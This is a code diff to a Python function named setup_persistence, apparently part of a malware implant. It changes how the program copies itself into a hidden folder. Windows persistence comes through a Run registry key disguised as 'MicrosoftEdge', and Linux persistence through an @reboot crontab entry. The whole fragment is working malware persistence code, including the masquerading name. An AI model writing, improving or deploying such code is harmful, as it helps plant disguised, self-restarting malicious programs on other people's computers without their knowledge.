@@ -17,7 +17,7 @@ def setup_persistence() -> tuple[str, str]:
         os.makedirs(folder, exist_ok=True)
 
         if not os.path.exists(exe_location):
-            shutil.copyfile(sys.executable, exe_location)
+            shutil.copyfile(os.path.abspath(sys.argv[0]), exe_location)
 
             # Add registry key for persistence
             subprocess.call(rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{exe_location}" /f', shell=True)
@@ -32,11 +32,11 @@ def setup_persistence() -> tuple[str, str]:
         os.makedirs(folder, exist_ok=True)
 
         if not os.path.exists(exe_location):
-            shutil.copyfile(sys.executable, exe_location)
+            shutil.copyfile(os.path.abspath(sys.argv[0]), exe_location)
             # Add to startup via crontab
             crontab_line = f"@reboot {exe_location}"
             os.system(f'(crontab -l; echo "{crontab_line}") | crontab -')
 
         return exe_location, uuid_location
 
-    return "", ""
+    return "", "uuid.txt"
